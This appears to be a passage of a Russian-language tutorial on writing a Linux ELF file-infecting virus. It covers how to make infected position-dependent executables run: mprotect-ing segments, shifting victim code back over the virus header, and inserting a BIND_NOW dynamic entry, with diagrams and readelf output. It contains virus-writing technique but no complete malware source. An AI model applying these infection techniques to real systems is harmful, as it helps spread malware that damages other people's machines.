загрузке ELF-а в память, mmap не учитывает выравнивание между сегментами,
он просто загружает файл в память, как есть.
А вот виртуальные адреса распределены с учетом этого выравнивания.
В результате если адрес первого сегмента кода у вас 0x400000, а адрес got
0x600e10, то 0x600e10 - 0x400000 = 200e10, что не является верным
смещением, потому что на самом деле оно просто e10. В результате попытка
сложить такое огромное смещение с базовым адресом ELF-а, а потом
прочитать по нему что-то приведет к сегфолту, потому что эта память не
выделена программе.

[TODO: придумать, как решить эту проблему]

Если вы счастливый обладатель компилятора, который сгенерировал для вашей
мишени позиционно-независимый код, то закончив редактирование названных
секций, вы получили работающий вирус. А для мене удачливых приключение
продолжается.

* Чем плох позиционно зависимый код.

Давайте сначала разбираться, что такое позиционно-зависимый код и в чем
его отличие от позиционно-независимого кода.

У нас есть абсолютная или относительная адресация. Абсолютная адресация
предполагает, что вы указываете вашей программе перейти на какой-то
концретный адрес. Например, вызвать адрес 0x400430 или поместить его в
какой-то регистр как параметр. Это значит, что если, например, ваша
программа будет работать корректно только в случае, если каждый раз будет
загружена по одним и тем же адресам. И такой код назвывается
позиционно-зависимым, поскольку зависит от того, с каких адресов
загружается программа.

Но мы можем использовать относительную адресацию. То есть, например,
высчитывать адрес, который мы вызываем или который используем как
параметр, как смещение от какой-то точки программы. Например, именно так
мы передаем управление мишени после того, как вирус отработал - прыгаем
на не конкретный адрес, а на адрес, который находится на определенном
смещении от следующей за прыжком инструкции. Такой код называется
позиционно-независимым, поскольку ему абсолютно неважно, с каких именно
адресов он будет загружен, а важно лишь соотношение между разными блоками
кода. Именно благодаря позиционно-независимому коду динамически
разделяемые библиотеки загружаются каждый раз с нового адреса, но при
этом продолжают работать.

Моя версия компилятора gcc генерирует позиционно-зависимый код. Как мы
помним, во время заражения мы вставили заголовок сегмента вируса, из-за
чего весь код мишени съехал на 56 байт. Из-за этого даже при идеально
отредактированных загоовоках, секциях и т.д. мишень будет выдавать
сегфолт.

Очевидное решение - урегулировать все ссылки - слишком трудоемкое. Мы
отказались вписывать вирус в первый сегмент кода мишени, потому что это
предполагало урегулирование ссылок в PLT. А здесь придется редактировать
ссылки во всей программе. Но решение есть, хотя оно немного радикальное.

* Урегулирование ссылок

Вместо того, чтоб искать каждую ссылку и редактировать ее отдельно, до
того как передать управление на код мишени, мы сдвинем ее код, начинающийся после
таблицы заголовков сегментов, как будто никакого заражения не было. Для этого просто
потребуется затереть заголовок вируса, перенеся весь код на 56 байт
назад. Тогда программа вернется на свои изначальные адреса, и
позиционно-зависимый код будет работать корректно.

Вот так будет выглядеть инфицированный файл до и после того, как мы подвинем код:

#+NAME: infected_elf3
#+BEGIN_SRC ditaa :file ./img/infected_elf3.png
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400000 | Заголовок ELF-файла         |  |0x400000 | Заголовок ELF-файла         |
  |         |  (ELF-header)               |  |         | (ELF-header)                |
  +---------+-----------------------------+  +---------+-----------------------------+

  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400040 |Таблица заголовков сегментов |  |0x400040 |Таблица заголовков сегментов |
  |         |(Program Header Table)       |  |         |(Program Header Table)       |
  |         |                             |  |         |                             |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400040 | PHDR Header                 |  |0x400040 | PHDR Header                 |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400078 | Interp Header               |  |0x400078 | Interp Header               |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x4000b0 | Load Header                 |  |0x4000b0 | Load Header                 |
  |         | (victim load header)        |  |         | (victim load header)        |
  +---------+-----------------------------+  +---------+-----------------------------+
  |...      | ...                         |  |...      | ...                         |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400190 | Load Header                 |
  |         | (malware load header)       |
  +---------+-----------------------------+


  +---------+-----------------------------+  +---------+-----------------------------+
  |0x400000 | Load Segment 1              |  |0x400000 | Load Segment 1              |
  |         | ...                         |  |         | ...                         |
  |0x400468 | original e_entry            |  |0x400430 | original e_entry            |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x600e48 | Load Segment 2              |  |0x600e10 | Load Segment 2              |
  +---------+-----------------------------+  +---------+-----------------------------+
  | ...     | ...                         |  | ...     | ...                         |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x80128a | Load Segment                |  |0x801252 | Load Segment                |
  |         | (malware load segment)      |  |         | (malware load segment)      |
  +---------+-----------------------------+  +---------+-----------------------------+
  |0x80158a | Transfer Control to         |  |0x801552 | Transfer Control to         |
  |         | original e_entry            |  |         | original e_entry            |
  +---------+-----------------------------+  +---------+-----------------------------+
#+END_SRC

#+results: infected_elf3
[[file:./img/infected_elf3.png]]

Таким образом мы затираем заголовок вируса и смещяем весь код на 56 байт
назад.

Обратите внимание, что при загрузке файла в память процесса, таблица
секций не загружается, поскольку она не является частью какого-то
загружаемого сегмента. А вот таблица заголовков сегментов продолжает
загружаться, поскольку явялется частью первого LOAD-сегмента.

Чтобы сдвинуть код, нужно решить несколько проблем.

1. Мы не можем писать в код по умолчанию.

   Сдвиг кода жертвы предполагает его буквальную перезапись.
   Но если вы попытаетесь что-то записать в секциях кода, программа сразу
   выдаст сегфолт.

   Решить эту проблему поможет системный вызов mprotect, который позволяет
   менять атрибуты у страниц памяти. Если заменить атрибуты на
   чтение/запись/исполнение, то мы сможем писать в код.

2. Мы не можем вызвать mprotect для всего ELF-файла сразу.

   Загруженный файл лежит на разных страницах памяти, между которыми у нас
   выравнивание. На рисунках выше видно, что между началом эльфа и его
   концом и у нас более 0x400000 байт. Mprotect просто не позволит умеет
   менять атрибуты у тысяч страниц памяти сразу.

   Поэтому нужно вычислить адрес каждого загружаемого сегмента и вызвать
   mprotect отдельно для каждого.

3. Вычисление адреса сегментов в памяти

   Нам заранее неизвестно, какой файл буде инфицровать вирус и с какого
   адреса он будет загружен. Поэтому нужно узнать базовый адрес эльфа,
   затем пройтись по заголовкам сегментов, вытащить смещение каждого
   сегмента и сложить его с базовым адресом. Таким образом мы получим
   адрес сегмента в памяти.

   Но как получить базовый адрес? Достаточно знать смещение от первого
   сегмента кода до оригинальной точки входа и от оригинальной точки
   входа до новой токи входа. Это легко вычислить на этапе заражения.
   Зная это смещение, можно взять адрес метки _start - она будет будет
   содержать в себе адрес нового e_entry - а затем вычесть из него
   заранее посчитанные смещения.


После вызова mprotect для каждого сегмента, можно спокойно их сдвигать,
просто побайтового переписывая с одного адреса, на другой.

* Самая большая проблема

К сожалению, даже описанные выше ухищрения не позволяют ELF-у корректно
отработать.

Если помните, в разделе о линкове упоминался буфер, в который не в меру
умный линкер записывает адреса, по которым лежат интересующие его и libc
записи из секции dynamic. Но раз мы подвинули весь код, то секция dynamic
тоже сдвинулась на 56 байт.

В резльутате мы получаем потрясающую ситуацию: не сдвигать код жертвы мы
не можем, потому что у нас позиционно-зависимый код, а сдвиг приводит к
тому, что адреса записей секции ~dynamic~ в буфере становятся
неактуальными и ~libc~ получает доступ к совсем не той информации, на
которую рассчитывает. И отредактировать эти адреса нет никакой возможности: они
не расположены в буфере один за другим, мы не знаем, сколько их и т.д.

Есть небольшой хак, который позволит нам отказаться от ленивого
связывания, а следоватлеьно отказаться от большей части адресов, которые
сохранены в секции dynamic. Линкер умеет связывать все и сразу до того,
как передаст управление программе, надо просто это указать. Делается это
с помощью записи, которая  находится в секции dynamic и называется
BIND_NOW. Она представляет собой 16 байт кода. Где в первые 8 байт вы пишете число
0x18. Вставить эту запись, в теории, можно в любое место секции dynamic,
но я вставляю ее перед записью NULL - это последняя запись в секции, она
обязательна и полностью заполнена нулями, так что ее легко найти.

Вот так выглядит секция dynamic до вставки записи:

#+BEGIN_SRC sh
  $ readelf -d hello

  Dynamic section at offset 0xe28 contains 24 entries:
    Тег        Тип                          Имя/Знач
   0x0000000000000001 (NEEDED)             Совм. исп. библиотека: [libc.so.6]
   0x000000000000000c (INIT)               0x4004a8
   0x000000000000000d (FINI)               0x400714
   0x0000000000000019 (INIT_ARRAY)         0x600e10
   0x000000000000001b (INIT_ARRAYSZ)       8 (байт)
   0x000000000000001a (FINI_ARRAY)         0x600e18
   0x000000000000001c (FINI_ARRAYSZ)       8 (байт)
   0x000000006ffffef5 (GNU_HASH)           0x400298
   0x0000000000000005 (STRTAB)             0x400378
   0x0000000000000006 (SYMTAB)             0x4002b8
   0x000000000000000a (STRSZ)              86 (байт)
   0x000000000000000b (SYMENT)             24 (байт)
   0x0000000000000015 (DEBUG)              0x0
   0x0000000000000003 (PLTGOT)             0x601000
   0x0000000000000002 (PLTRELSZ)           144 (байт)
   0x0000000000000014 (PLTREL)             RELA
   0x0000000000000017 (JMPREL)             0x400418
   0x0000000000000007 (RELA)               0x400400
   0x0000000000000008 (RELASZ)             24 (байт)
   0x0000000000000009 (RELAENT)            24 (байт)
   0x000000006ffffffe (VERNEED)            0x4003e0
   0x000000006fffffff (VERNEEDNUM)         1
   0x000000006ffffff0 (VERSYM)             0x4003ce
   0x0000000000000000 (NULL)               0x0
#+END_SRC

А вот так после:
#+BEGIN_SRC sh
  $ readelf -d hello

  Dynamic section at offset 0xe60 contains 25 entries:
    Тег        Тип                          Имя/Знач
   0x0000000000000001 (NEEDED)             Совм. исп. библиотека: [libc.so.6]
   0x000000000000000c (INIT)               0x4004e0
   0x000000000000000d (FINI)               0x40074c
   0x0000000000000019 (INIT_ARRAY)         0x600e48
   0x000000000000001b (INIT_ARRAYSZ)       8 (байт)
   0x000000000000001a (FINI_ARRAY)         0x600e50
   0x000000000000001c (FINI_ARRAYSZ)       8 (байт)
   0x000000006ffffef5 (GNU_HASH)           0x4002d0
   0x0000000000000005 (STRTAB)             0x4003b0
   0x0000000000000006 (SYMTAB)             0x4002f0
   0x000000000000000a (STRSZ)              86 (байт)
   0x000000000000000b (SYMENT)             24 (байт)
   0x0000000000000015 (DEBUG)              0x0
   0x0000000000000003 (PLTGOT)             0x601048
   0x0000000000000002 (PLTRELSZ)           144 (байт)
   0x0000000000000014 (PLTREL)             RELA
   0x0000000000000017 (JMPREL)             0x400450
   0x0000000000000007 (RELA)               0x400438
   0x0000000000000008 (RELASZ)             24 (байт)
   0x0000000000000009 (RELAENT)            24 (байт)
   0x000000006ffffffe (VERNEED)            0x400418
   0x000000006fffffff (VERNEEDNUM)         1
   0x000000006ffffff0 (VERSYM)             0x400406
   0x0000000000000018 (BIND_NOW)
   0x0000000000000000 (NULL)               0x0
#+END_SRC

Обратите внимание, что все адреса изменились на 56 байт, поскольку
вариант dynamic "после" взят из зараженного файла.

К сожалению, BIND_NOW решает проблему с ленивым связываением, но не
решает проблему с работой libc.

libc должна обеспечить корректный старт и завершение сишной
программе. Она настраивает стек, регистры и т.д. Для этого она использует
код, который компилятор вписал в код вашей программы. Для инициализации
программы используется код из секций init и init_array, а для завершения
программы используется код из fini и fini_array. Доступ к этому коду libc
получает с помощью записей dynamic, которые видны на выводе dynamic
выше. А адреса этих записей libc берет из уже известного нам буфера, куда
их кладет линкер на этапе линковки. И у нас нет возможности повлиять на
этот процесс, кроме самого радикального.

Нам сильно повезло и все эти записи находятся в начале секции dynamic. К
секции напрямую никакой другой код не обращается, а линкер больше
включаться не будет, потому что мы все связали сразу. Следовательно, мы
можем не двигать секцию dynamic - единственную из всего кода мишени - но
при этом сдвинуть весь код, ниже нее, на 72 байта - размер заголловка
вируса + размер записи BIND_NOW - просто затерев несколько записей dynamic.
Таким образом нужные libc записи окажутся на тех адресах, которые лнкер
сохранил в буфер, и libc сможет без проблем получить все, что ей нужно.

Посмотрим, как будет выглядеть файл до и после того, как мы подвинули код
мишени:

#+NAME: infected_elf5
#+BEGIN_SRC ditaa :file ./img/infected_elf5.png
  +-------------------------------------+  +--------------------------------------+
  |0x400000 Заголовок ELF-файла         |  |0x400000 Заголовок ELF-файла          |
  |         (ELF-header)                |  |         (ELF-header )                |
  +-------------------------------------+  +--------------------------------------+

  +-------------------------------------+  +--------------------------------------+
  |0x400040 Таблица заголовков сегментов|  |0x400040  Таблица заголовков сегментов|
  |         (Program Header Table)      |  |          (Program Header Table)      |
  +-------------------------------------+  +--------------------------------------+
  |0x400040 PHDR Header                 |  |0x400040   PHDR Header                |
  |0x400078 Interp Header               |  |0x400078   Interp Header              |
  |0x4000b0 Load Header                 |  |0x4000b0   Load Header                |
  |         (victim load header)        |  |           (victim load header)       |
  |...      ...                         |  |...        ...                        |
  +-------------------------------------+  +--------------------------------------+
  |0x400190 Load Header                 |
  |         (malware load header)       |
  +-------------------------------------+


  +-------------------------------------+  +--------------------------------------+
  |0x400000 Load Segment 1              |  |0x400000   Load Segment 1             |
  |         ...                         |  |           ...                        |
  |0x400468 original e_entry            |  |0x400430   original e_entry           |
  +-------------------------------------+  +--------------------------------------+
  |0x600e48 Load Segment 2              |  |0x600e10   Load Segment 2             |
  +-------------------------------------+  +--------------------------------------+
  | ...     ...                         |  | ...       ...                        |
  +-------------------------------------+  +--------------------------------------+

  +-------------------------------------+  +--------------------------------------+
  |0x600e60 Dynamic Section             |  |0x600e28   Dynamic Section            |
  |                                     |  |                                      |
  +-------------------------------------+  +--------------------------------------+
  |0x600e70 INIT                        |  |0x600e38   INIT                       |
  +-------------------------------------+  +--------------------------------------+
  |0x600e60 FINI                        |  |0x600e48   FINI                       |
  +-------------------------------------+  +--------------------------------------+
  |...      ...                         |  |...        ...                        |
  +-------------------------------------+
  |0x600fd0 BIND_NOW                    |
  +-------------------------------------+
  |0x600fd0 NULL                        |
  +-------------------------------------+


  +-------------------------------------+  +--------------------------------------+
  |0x80128a Load Segment                |  |0x801242   Load Segment               |
  |         (malware load segment)      |  |           (malware load segment)     |
  +-------------------------------------+  +--------------------------------------+
  |0x80158a Transfer Control to         |  |0x801542   Transfer Control to        |
  |         original e_entry            |  |           original e_entry           |
  +-------------------------------------+  +--------------------------------------+
#+END_SRC

Обратите внимание, что весь код после секции dynamic перемещается не на
56 байт, а на 72 байта.

#+results: infected_elf5
[[file:./img/infected_elf5.png]]

* Заключение

Я надеюсь, что мой опыт был кому-то полезен и теперь вы сможете не просто
реализовать такой же вирус как у меня, но и создать свой собственный,
поскольку ELF-файлы, загрузка программ и линковка перестали быть для вас
каким-то колдунством. К тому же, эти знания достатоно универсальны, чтоб
вы могли использовать их в других своих проектах, не относящихся к
вирусописанию.
